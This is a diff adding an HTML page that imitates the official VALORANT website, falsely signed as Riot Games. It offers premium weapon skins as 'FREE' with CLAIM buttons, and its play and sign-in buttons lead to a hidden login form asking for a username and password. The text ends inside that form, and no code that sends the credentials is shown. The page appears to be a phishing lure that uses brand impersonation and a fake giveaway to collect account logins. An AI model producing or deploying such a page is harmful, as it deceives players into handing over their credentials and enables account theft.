@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VALORANT</title>
+  <link rel="stylesheet" href="style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<!-- LOADER -->
+<div id="loader">
+  <div class="loader-content">
+    <svg class="loader-v" viewBox="0 0 60 80" fill="none">
+      <path d="M0 0 L30 60 L60 0 L48 0 L30 36 L12 0Z" fill="#ff4655"/>
+    </svg>
+    <div class="loader-bar-track"><div class="loader-bar-fill" id="loaderFill"></div></div>
+    <p class="loader-label">LOADING</p>
+  </div>
+</div>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <div class="nav-logo">
+    <svg viewBox="0 0 60 80" fill="none" width="22" height="28">
+      <path d="M0 0 L30 60 L60 0 L48 0 L30 36 L12 0Z" fill="#ff4655"/>
+    </svg>
+    <span>VALORANT</span>
+  </div>
+  <div class="nav-links">
+    <a href="#home">HOME</a>
+    <a href="#agents">AGENTS</a>
+    <a href="#skins">SKINS</a>
+    <a href="#media">MEDIA</a>
+    <a href="#news">NEWS</a>
+  </div>
+  <div class="nav-right">
+    <button class="nav-signin" onclick="showPage('login')">SIGN IN</button>
+    <button class="nav-play" onclick="showPage('login')">PLAY FREE</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="hero-gif"></div>
+  <div class="hero-overlay"></div>
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <div class="hero-eyebrow">EPISODE 10 · ACT III</div>
+    <h1 class="hero-title"><span class="title-v">V</span>ALORANT</h1>
+    <p class="hero-sub">A 5V5 TACTICAL SHOOTER — PRECISION MEETS ABILITIES</p>
+    <div class="hero-btns">
+      <button class="btn-primary" onclick="showPage('login')">
+        <span>PLAY FOR FREE</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
+      </button>
+      <button class="btn-ghost">WATCH TRAILER</button>
+    </div>
+    <div class="hero-stats">
+      <div class="hstat"><span class="hstat-n">25M+</span><span class="hstat-l">PLAYERS</span></div>
+      <div class="hstat-div"></div>
+      <div class="hstat"><span class="hstat-n">24</span><span class="hstat-l">AGENTS</span></div>
+      <div class="hstat-div"></div>
+      <div class="hstat"><span class="hstat-n">11</span><span class="hstat-l">MAPS</span></div>
+    </div>
+  </div>
+  <div class="hero-scroll-cue">
+    <div class="scroll-line-anim"></div>
+    <span>SCROLL</span>
+  </div>
+</section>
+
+<!-- AGENTS -->
+<section class="section agents-section" id="agents">
+  <div class="sec-header">
+    <div class="sec-tag">// ROSTER</div>
+    <h2 class="sec-title">AGENTS</h2>
+    <p class="sec-sub">Unique abilities. Unrelenting tactics. Choose your legend.</p>
+  </div>
+  <div class="agents-grid">
+    <div class="agent-card">
+      <div class="agent-img-wrap">
+        <img src="https://i.pinimg.com/1200x/b6/87/7d/b6877d098c22f6c2de5e9e28d2b12991.jpg" alt="Jett">
+        <div class="agent-shine"></div>
+      </div>
+      <div class="agent-info">
+        <span class="agent-role">DUELIST</span>
+        <h3 class="agent-name">JETT</h3>
+        <p class="agent-origin">🇰🇷 South Korea</p>
+      </div>
+    </div>
+    <div class="agent-card">
+      <div class="agent-img-wrap">
+        <img src="https://i.pinimg.com/1200x/94/ce/43/94ce435e2ca33e542431551ca7717bdc.jpg" alt="Phoenix">
+        <div class="agent-shine"></div>
+      </div>
+      <div class="agent-info">
+        <span class="agent-role">DUELIST</span>
+        <h3 class="agent-name">PHOENIX</h3>
+        <p class="agent-origin">🇬🇧 United Kingdom</p>
+      </div>
+    </div>
+    <div class="agent-card">
+      <div class="agent-img-wrap">
+        <img src="https://i.pinimg.com/1200x/13/32/7d/13327d5353d15478bf9fe0b360b2aac8.jpg" alt="Sage">
+        <div class="agent-shine"></div>
+      </div>
+      <div class="agent-info">
+        <span class="agent-role">SENTINEL</span>
+        <h3 class="agent-name">SAGE</h3>
+        <p class="agent-origin">🇨🇳 China</p>
+      </div>
+    </div>
+    <div class="agent-card">
+      <div class="agent-img-wrap">
+        <img src="https://i.pinimg.com/1200x/63/93/01/639301140997355f2d94cc6cc304bff3.jpg" alt="Reyna">
+        <div class="agent-shine"></div>
+      </div>
+      <div class="agent-info">
+        <span class="agent-role">DUELIST</span>
+        <h3 class="agent-name">REYNA</h3>
+        <p class="agent-origin">🇲🇽 Mexico</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SKINS -->
+<section class="section skins-section" id="skins">
+
+  <div class="sec-header">
+    <div class="sec-tag">// FREE STORE</div>
+    <h2 class="sec-title">PREMIUM SKINS</h2>
+    <p class="sec-sub">
+      Claim these exclusive skins for free — limited time only.
+    </p>
+  </div>
+
+  <div class="skins-grid">
+
+    <!-- PRIME VANDAL -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#f0b94a,#ffd780)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://i.pinimg.com/1200x/b2/3c/45/b23c457a242c0e946b6425238d24bd5f.jpg"
+          alt="Prime Vandal"
+          class="skin-image"
+        >
+
+        <div class="skin-glow"
+          style="background:radial-gradient(ellipse,rgba(240,185,74,.4),transparent)">
+        </div>
+
+      </div>
+
+      <div class="skin-tag" style="color:#f0b94a">
+        ★ PREMIUM EDITION
+      </div>
+
+      <div class="skin-name">
+        PRIME VANDAL
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">1775 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'PRIME VANDAL')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- REAVER PHANTOM -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#8b4ca8,#c77dff)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://valorantstrike.com/wp-content/uploads/Valorant-Demonstone-Vandal-Article-5.jpg"
+          alt="Prelude To Chaos"
+          class="skin-image"
+        >
+
+        <div class="skin-glow"
+          style="background:radial-gradient(ellipse,rgba(139,76,168,.4),transparent)">
+        </div>
+
+      </div>
+
+      <div class="skin-tag" style="color:#c77dff">
+        ★ PREMIUM EDITION
+      </div>
+
+      <div class="skin-name">
+        Prelude To Chaos
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">1775 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'REAVER PHANTOM')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- GLITCHPOP -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#00d4ff,#ff006e)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://media.printables.com/media/prints/178608/images/1674213_91e6b368-ef24-46a1-bc28-f1d5c8ce5d91/thumbs/inside/1280x960/jpg/glitchpop-vandal.webp"
+          alt="Glitchpop Vandal"
+          class="skin-image"
+        >
+
+        <div class="skin-glow"
+          style="background:radial-gradient(ellipse,rgba(0,212,255,.4),transparent)">
+        </div>
+
+      </div>
+
+      <div class="skin-tag" style="color:#00d4ff">
+        ✦ EXCLUSIVE
+      </div>
+
+      <div class="skin-name">
+        GLITCHPOP VANDAL
+      </div>
+
+      <div class="skin-type">
+        PISTOL
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">2175 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'GLITCHPOP FRENZY')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- ELDERFLAME -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#ff6b35,#ff4655)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="data:image/jpeg;base64,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"
+          alt="Elderflame Operator"
+          class="skin-image"
+        >
+
+        <div class="skin-glow"
+          style="background:radial-gradient(ellipse,rgba(255,107,53,.4),transparent)">
+        </div>
+
+      </div>
+
+      <div class="skin-tag" style="color:#ff6b35">
+        ✦ EXCLUSIVE
+      </div>
+
+      <div class="skin-name">
+        ELDERFLAME OPERATOR
+      </div>
+
+      <div class="skin-type">
+        SNIPER
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">2475 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'ELDERFLAME OPERATOR')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- ION -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#c9f7ff,#7de2ff)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQlhWfvTafIh-vz_2kBwMlTKTEFXFkhpPV5Yg&s"
+          alt="Ion Phantom"
+          class="skin-image"
+        >
+
+      </div>
+
+      <div class="skin-tag" style="color:#7de2ff">
+        ★ PREMIUM
+      </div>
+
+      <div class="skin-name">
+        ION PHANTOM
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">1775 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'ION PHANTOM')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- SENTINELS -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#ff2d55,#ff6a88)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTA3FfEeLnf7V6YNQJJUhuRjUx_itQ9FK3fHg&s"
+          alt="Sentinels Vandal"
+          class="skin-image"
+        >
+
+      </div>
+
+      <div class="skin-tag" style="color:#ff2d55">
+        ✦ CHAMPIONS
+      </div>
+
+      <div class="skin-name">
+        SENTINELS VANDAL
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">2675 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'SENTINELS VANDAL')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- KURONAMI -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#0f172a,#38bdf8)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://valorantstrike.com/wp-content/uploads/Valorant-Kuronami-Collection-Vandal-Purple.jpg"
+          alt="Kuronami Vandal"
+          class="skin-image"
+        >
+
+      </div>
+
+      <div class="skin-tag" style="color:#38bdf8">
+        ✦ EXCLUSIVE
+      </div>
+
+      <div class="skin-name">
+        KURONAMI VANDAL
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">2375 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'KURONAMI VANDAL')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+    <!-- ONI -->
+    <div class="skin-card">
+
+      <div class="skin-rarity-bar"
+        style="background:linear-gradient(90deg,#ff0000,#ff7b00)">
+      </div>
+
+      <div class="skin-weapon-vis">
+
+        <img
+          src="https://valorantstrike.com/wp-content/uploads/2020/07/Valorant-Oni-Collection-Phantom-HD.jpg"
+          alt="Oni Phantom"
+          class="skin-image"
+        >
+
+      </div>
+
+      <div class="skin-tag" style="color:#ff7b00">
+        ★ PREMIUM
+      </div>
+
+      <div class="skin-name">
+        ONI PHANTOM
+      </div>
+
+      <div class="skin-type">
+        RIFLE
+      </div>
+
+      <div class="skin-footer">
+        <div>
+          <span class="skin-old-price">1775 VP</span>
+          <span class="skin-free">FREE</span>
+        </div>
+
+        <button
+          class="skin-btn"
+          onclick="claimSkin(this,'ONI PHANTOM')">
+          CLAIM
+        </button>
+      </div>
+
+    </div>
+
+  </div>
+
+</section>
+
+<!-- MEDIA -->
+<section class="section media-section" id="media">
+  <div class="sec-header">
+    <div class="sec-tag">// VISUAL</div>
+    <h2 class="sec-title">WALLPAPERS</h2>
+  </div>
+  <div class="media-grid">
+    <div class="media-card media-card--large">
+      <img src="https://img.etimg.com/thumb/width-1200,height-900,imgsize-161656,resizemode-75,msid-109539938/news/international/us/valorant-episode-8-act-3-this-is-what-we-know-about-release-date-time-and-expectations.jpg" alt="Ep8">
+      <div class="media-overlay"><span>EP8 ACT III KEY ART</span><button class="media-dl-btn">↓ DOWNLOAD</button></div>
+    </div>
+    <div class="media-card">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgGp_-4ocsIUCpY_wsuJIqG67DD4z80sY-KQ&s" alt="Iso">
+      <div class="media-overlay"><span>ISO — 3840×2160</span><button class="media-dl-btn">↓ DOWNLOAD</button></div>
+    </div>
+    <div class="media-card">
+      <img src="https://cmsassets.rgpub.io/sanity/images/dsfx7636/news/a0572f7ee2ad797c9e4be04e51ee39e00ae685e4-1920x1080.jpg?accountingTag=VAL&auto=format&fit=fill&q=80&w=1920" alt="Clove">
+      <div class="media-overlay"><span>CLOVE — 3840×2160</span><button class="media-dl-btn">↓ DOWNLOAD</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- NEWS -->
+<section class="section news-section" id="news">
+  <div class="sec-header">
+    <div class="sec-tag">// UPDATES</div>
+    <h2 class="sec-title">LATEST NEWS</h2>
+  </div>
+  <div class="news-grid">
+    <div class="news-card news-card--feature">
+      <img src="https://cmsassets.rgpub.io/sanity/images/dsfx7636/news/419bd9683215afef219e88536cfa96315fd38532-1920x1080.jpg" alt="Patch">
+      <div class="news-card-overlay">
+        <span class="news-tag">PATCH NOTES</span>
+        <h3 class="news-title">VALORANT PATCH 10.08 — BALANCE CHANGES & NEW CONTENT</h3>
+        <p class="news-date">MAY 2026</p>
+      </div>
+    </div>
+    <div class="news-card">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1EeAaHpzo14U7tozyofZe6qlQoY-2I7HMgw&s" alt="VCT">
+      <div class="news-card-overlay">
+        <span class="news-tag">ESPORTS</span>
+        <h3 class="news-title">VCT MASTERS CHAMPION - NONGSHIM</h3>
+        <p class="news-date">APR 2026</p>
+      </div>
+    </div>
+    <div class="news-card">
+      <img src="https://media.altchar.com/prod/images/gm_featured_image/f14ee017c248-valorant.jpg" alt="Skins">
+      <div class="news-card-overlay">
+        <span class="news-tag">UPDATE</span>
+        <h3 class="news-title">NEW SKINS RELEASED</h3>
+        <p class="news-date">MAR 2026</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <svg viewBox="0 0 60 80" fill="none" width="24" height="32">
+        <path d="M0 0 L30 60 L60 0 L48 0 L30 36 L12 0Z" fill="#ff4655"/>
+      </svg>
+      <span>VALORANT</span>
+    </div>
+    <div class="footer-links">
+      <a href="#">SUPPORT</a>
+      <a href="#">PRIVACY</a>
+      <a href="#">TERMS</a>
+      <a href="#">ESPORTS</a>
+    </div>
+    <p class="footer-copy">© 2026 RIOT GAMES, INC. ALL RIGHTS RESERVED.</p>
+  </div>
+</footer>
+
+<!-- LOGIN PAGE -->
+<div id="login-page" class="hidden-page">
+  <div class="login-bg-scene">
+    <img src="https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt82ecfd505c0df2a6/66319adf74a6ef53ef3d9e0c/VALORANT_Clove_3840x2160.jpg" class="login-bg-img" alt="">
+    <div class="login-bg-darken"></div>
+  </div>
+  <div class="login-card">
+    <button class="login-back-x" onclick="showPage('main')">✕</button>
+    <h2 class="login-card-title">Sign in</h2>
+    <div id="login-alert" class="login-alert hidden"></div>
+    <div class="lc-field">
+      <label class="lc-label">USERNAME</label>
+      <input type="text" id="login-username" class="lc-input">
+    </div>
+    <div class="lc-field">
+      <label class="lc-label">PASSWORD</label>
+      <div class="lc-input-wrap">
